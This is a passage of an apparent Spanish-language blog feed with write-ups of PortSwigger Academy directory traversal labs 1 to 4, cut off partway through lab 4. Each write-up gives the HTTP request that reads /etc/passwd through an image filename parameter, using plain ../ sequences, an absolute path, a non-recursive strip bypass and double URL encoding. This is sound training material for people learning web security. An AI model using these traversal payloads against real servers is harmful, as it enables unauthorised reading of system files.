&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 102; 
			flex-basis: 246px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-1/web.png&#34; data-size=&#34;1796x1750&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-1/web.png&#34;
			width=&#34;1796&#34;
			height=&#34;1750&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-1/web_hu2e2fcc0afb3a225c347dd455e351f57b_1039023_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-1/web_hu2e2fcc0afb3a225c347dd455e351f57b_1039023_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Web&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Web&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Hasta ahi todo bien pero viendo burpsuite podemos ver que se hace la peticion para poder recuperar la imagen y mostrarla&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 173; 
			flex-basis: 416px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-1/request.png&#34; data-size=&#34;1536x885&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-1/request.png&#34;
			width=&#34;1536&#34;
			height=&#34;885&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-1/request_hu0f6e6c347c00310841bf3fcc26133915_241278_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-1/request_hu0f6e6c347c00310841bf3fcc26133915_241278_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud de imagen&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud de imagen&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora lo que podemos hacer es intentar recuperar el archivo &lt;code&gt;/etc/passwd&lt;/code&gt; del servidor usando la siguiente solicitud, agregando &lt;code&gt;../../../&lt;/code&gt; para ir hasta la raiz como es en linux&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;GET /image?filename=../../../etc/passwd
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 258; 
			flex-basis: 620px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-1/request2.png&#34; data-size=&#34;1535x594&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-1/request2.png&#34;
			width=&#34;1535&#34;
			height=&#34;594&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-1/request2_hu62aecc6cf551ac653d6682f8334519fd_115517_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-1/request2_hu62aecc6cf551ac653d6682f8334519fd_115517_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud de archivo passwd&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud de archivo passwd&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resuelto el lab&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 185; 
			flex-basis: 445px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-1/resuelto.png&#34; data-size=&#34;1788x963&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-1/resuelto.png&#34;
			width=&#34;1788&#34;
			height=&#34;963&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-1/resuelto_hua34b2a302674e5e82efcf7b5321be1ee_536960_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-1/resuelto_hua34b2a302674e5e82efcf7b5321be1ee_536960_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/file-path-traversal/lab-simple&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Directory Traversal Lab 2</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-2/</link>
        <pubDate>Sun, 28 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-2/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-2/head.png" alt="Featured image of post Portswigger Academy Learning Path: Directory Traversal Lab 2" /&gt;&lt;h1 id=&#34;lab-file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass&#34;&gt;Lab: File path traversal, traversal sequences blocked with absolute path bypass&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder recuperar el archivo &lt;code&gt;/etc/passwd&lt;/code&gt; todo esto en una vulnerabilidad la cual es la que desplega las imagenes.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;La web muestra un post el cual contiene contenido y una imagen.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 122; 
			flex-basis: 293px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-2/web.png&#34; data-size=&#34;1805x1474&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-2/web.png&#34;
			width=&#34;1805&#34;
			height=&#34;1474&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-2/web_hu055f6d0eded21e6a838d8e54966bcf9d_488434_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-2/web_hu055f6d0eded21e6a838d8e54966bcf9d_488434_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Web&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Web&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Hasta ahi todo bien pero viendo burpsuite podemos ver que se hace la peticion para poder recuperar la imagen y mostrarla&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 183; 
			flex-basis: 439px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-2/request.png&#34; data-size=&#34;1534x837&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-2/request.png&#34;
			width=&#34;1534&#34;
			height=&#34;837&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-2/request_huc807d3254dbb7962786da386e519d393_221860_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-2/request_huc807d3254dbb7962786da386e519d393_221860_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud de imagen&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud de imagen&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora lo que podemos hacer es intentar recuperar el archivo &lt;code&gt;/etc/passwd&lt;/code&gt; del servidor usando la siguiente solicitud pero hay una funcion del sistema que no acepta los valores de inyeccion que se utilizan como &lt;code&gt;../../../&lt;/code&gt; por lo que si enviamos la solicitud de esa manera no recibiremos nada. Pero igual podemos enviar la ruta absoluta&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;La aplicacion bloquea solicitudes de Directory Traversal pero trata el nombre del archivo como relativo a un directorio de trabajo predeterminado&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;GET /image?filename=/etc/passwd
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 253; 
			flex-basis: 608px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-2/request2.png&#34; data-size=&#34;1534x605&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-2/request2.png&#34;
			width=&#34;1534&#34;
			height=&#34;605&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-2/request2_hucb83224a7c1e2e39787b8ebd1433239e_115350_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-2/request2_hucb83224a7c1e2e39787b8ebd1433239e_115350_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud de archivo passwd&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud de archivo passwd&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resuelto el lab&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 254; 
			flex-basis: 610px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-2/resuelto.png&#34; data-size=&#34;1830x720&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-2/resuelto.png&#34;
			width=&#34;1830&#34;
			height=&#34;720&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-2/resuelto_hu021907906e86cb08fc4ff6d1c7b63f66_185691_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-2/resuelto_hu021907906e86cb08fc4ff6d1c7b63f66_185691_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Directory Traversal Lab 3</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-3/</link>
        <pubDate>Sun, 28 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-3/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-3/head.png" alt="Featured image of post Portswigger Academy Learning Path: Directory Traversal Lab 3" /&gt;&lt;h1 id=&#34;lab-file-path-traversal-traversal-sequences-stripped-non-recursively&#34;&gt;Lab: File path traversal, traversal sequences stripped non-recursively&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder recuperar el archivo &lt;code&gt;/etc/passwd&lt;/code&gt; todo esto en una vulnerabilidad la cual es la que desplega las imagenes.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;La web muestra un post el cual contiene contenido y una imagen.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 110; 
			flex-basis: 265px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-3/web.png&#34; data-size=&#34;1801x1629&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-3/web.png&#34;
			width=&#34;1801&#34;
			height=&#34;1629&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-3/web_huc721b94bb86f403ef615a5a318a11053_878281_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-3/web_huc721b94bb86f403ef615a5a318a11053_878281_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Web&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Web&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Hasta ahi todo bien pero viendo burpsuite podemos ver que se hace la peticion para poder recuperar la imagen y mostrarla&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 170; 
			flex-basis: 409px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-3/request.png&#34; data-size=&#34;1530x897&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-3/request.png&#34;
			width=&#34;1530&#34;
			height=&#34;897&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-3/request_hu204bb183324198d925cbb571809caeac_238475_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-3/request_hu204bb183324198d925cbb571809caeac_238475_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud de imagen&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud de imagen&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Lo que sabemos es que el backend eliminara los valores ingresados para realizar directory traversal como &lt;code&gt;../ o /&lt;/code&gt; en este caso lo que hay que hacer es saltarse esto para que el sistema aun pueda borrar las inyecciones pero nos deje inyectar las nuestras que al final terminen en el mismo proceso.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Caracteres ingresados&lt;/th&gt;
&lt;th&gt;Caracteres despues de eliminacion&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;../&lt;/td&gt;
&lt;td&gt;Vacio&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/&lt;/td&gt;
&lt;td&gt;Vacio&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;hellip;/./&lt;/td&gt;
&lt;td&gt;../&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;..//&lt;/td&gt;
&lt;td&gt;/&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;./&lt;/td&gt;
&lt;td&gt;Vacio&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;GET /image?filename=..././..././..././etc..//passwd HTTP/1.1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Y obtenemos el archivo &lt;code&gt;/etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 235; 
			flex-basis: 566px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-3/request2.png&#34; data-size=&#34;1540x653&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-3/request2.png&#34;
			width=&#34;1540&#34;
			height=&#34;653&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-3/request2_hu5aaa62fdb461b31706275c7045629526_120068_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-3/request2_hu5aaa62fdb461b31706275c7045629526_120068_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud de archivo passwd&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud de archivo passwd&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resuelto el lab&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 195; 
			flex-basis: 468px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-3/resuelto.png&#34; data-size=&#34;1789x917&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-3/resuelto.png&#34;
			width=&#34;1789&#34;
			height=&#34;917&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-3/resuelto_hu5972d871c1fb3d5f830886e4f6d263fd_173696_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-3/resuelto_hu5972d871c1fb3d5f830886e4f6d263fd_173696_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Directory Traversal Lab 4</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/</link>
        <pubDate>Sun, 28 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/head.png" alt="Featured image of post Portswigger Academy Learning Path: Directory Traversal Lab 4" /&gt;&lt;h1 id=&#34;lab-file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode&#34;&gt;Lab: File path traversal, traversal sequences stripped with superfluous URL-decode&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder recuperar el archivo &lt;code&gt;/etc/passwd&lt;/code&gt; todo esto en una vulnerabilidad la cual es la que desplega las imagenes.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;La web muestra un post el cual contiene contenido y una imagen.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 112; 
			flex-basis: 269px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/web.png&#34; data-size=&#34;1797x1600&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/web.png&#34;
			width=&#34;1797&#34;
			height=&#34;1600&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/web_hu190ad23e192f5eeef1169bd355039f1c_898379_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/web_hu190ad23e192f5eeef1169bd355039f1c_898379_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Web&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Web&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Hasta ahi todo bien pero viendo burpsuite podemos ver que se hace la peticion para poder recuperar la imagen y mostrarla&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 172; 
			flex-basis: 415px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/request.png&#34; data-size=&#34;1527x883&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/request.png&#34;
			width=&#34;1527&#34;
			height=&#34;883&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/request_hu01864c6ddbe5b679fe490dd6a972af73_249116_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/request_hu01864c6ddbe5b679fe490dd6a972af73_249116_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud de imagen&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud de imagen&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Lo que sabemos es que el backend eliminara los valores ingresados para realizar directory traversal como &lt;code&gt;../ o /&lt;/code&gt; pero luego de eliminarlo realiza la decodificacion de las entradas de la URL antes de usarla, por lo que podemos codificar los caracteres en formato URL. En este caso para resolverlo debemos usar doble codificacion como vemos, que esta codificado doble lo podemos decodificar por terminal o usando Cyberchef&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;s2&#34;&gt;&amp;#34;%252e%252e%252f&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; python3 -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;import sys; from urllib.parse import unquote; print(unquote(sys.stdin.read()));&amp;#34;&lt;/span&gt;
%2e%2e%2f
&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;s2&#34;&gt;&amp;#34;%2e%2e%2f&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; python3 -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;import sys; from urllib.parse import unquote; print(unquote(sys.stdin.read()));&amp;#34;&lt;/span&gt;
../
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 142; 
			flex-basis: 341px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/codificado.png&#34; data-size=&#34;1509x1059&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/codificado.png&#34;
			width=&#34;1509&#34;
			height=&#34;1059&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/codificado_huf33e036e58ee5da710645adf98fbc9da_45761_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/codificado_huf33e036e58ee5da710645adf98fbc9da_45761_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Decodificacion de strings URL&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Decodificacion de strings URL&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y realizamos la peticion:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Y obtenemos el archivo &lt;code&gt;/etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 230; 
			flex-basis: 553px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/request2.png&#34; data-size=&#34;1538x667&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/request2.png&#34;
			width=&#34;1538&#34;
			height=&#34;667&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/request2_hu92c6f294e430b57b0faa38f1689d6b86_117584_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/request2_hu92c6f294e430b57b0faa38f1689d6b86_117584_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud de archivo passwd&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud de archivo passwd&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resuelto el lab&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 169; 
			flex-basis: 406px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/resuelto.png&#34; data-size=&#34;1833x1082&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/resuelto.png&#34;
			width=&#34;1833&#34;
			height=&#34;1082&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/resuelto_hu87d9b9a8d9ff090c2bc78c64b319365e_632932_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-4/resuelto_hu87d9b9a8d9ff090c2bc78c64b319365e_632932_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
